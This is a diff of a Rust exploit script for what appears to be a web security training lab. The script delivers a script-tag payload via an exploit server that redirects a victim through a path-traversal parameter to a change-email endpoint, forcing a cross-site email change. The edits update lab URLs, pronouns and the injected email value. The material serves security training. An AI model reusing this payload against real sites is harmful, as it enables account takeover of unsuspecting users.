@@ -10,7 +10,7 @@
 *           in order to redirect the victim to their profile and change their email using
 *           URL parameters
 *        2. Deliver the exploit to the victim
-*        3. The victim's email will be changed after he trigger the exploit
+*        3. The victim's email will be changed after they trigger the exploit
 *
 **********************************************************************************************/
 #![allow(unused)]
@@ -34,10 +34,10 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let lab_url = "https://0a08006303b6d9c0835cc0bc00e900ab.web-security-academy.net";
+    let lab_url = "https://0af4002c03adc60580ab8b6b000f0048.web-security-academy.net";
 
     // change this to your exploit server URL
-    let exploit_server_url = "https://exploit-0a2700f003c0d950831ebf6a015500f1.exploit-server.net";
+    let exploit_server_url = "https://exploit-0a6a000c038ec6b980208a9a011900a2.exploit-server.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -52,7 +52,7 @@ fn main() {
     // payload to change the victim's email
     let payload = format!(
         r###"<script>
-                location = "{lab_url}/post/comment/confirmation?postId=../my-account/change-email%3femail=hacked%40you.com%26submit=1"
+                location = "{lab_url}/post/comment/confirmation?postId=../my-account/change-email%3femail={new_email}%26submit=1"
             </script>    
       "###
     );
@@ -79,7 +79,7 @@ fn main() {
     println!("{}", "OK".green());
     println!(
         "{}",
-        "🗹 The victim's email will be changed after he trigger the exploit".white()
+        "🗹 The victim's email will be changed after they trigger the exploit".white()
     );
     println!(
         "{} {}",
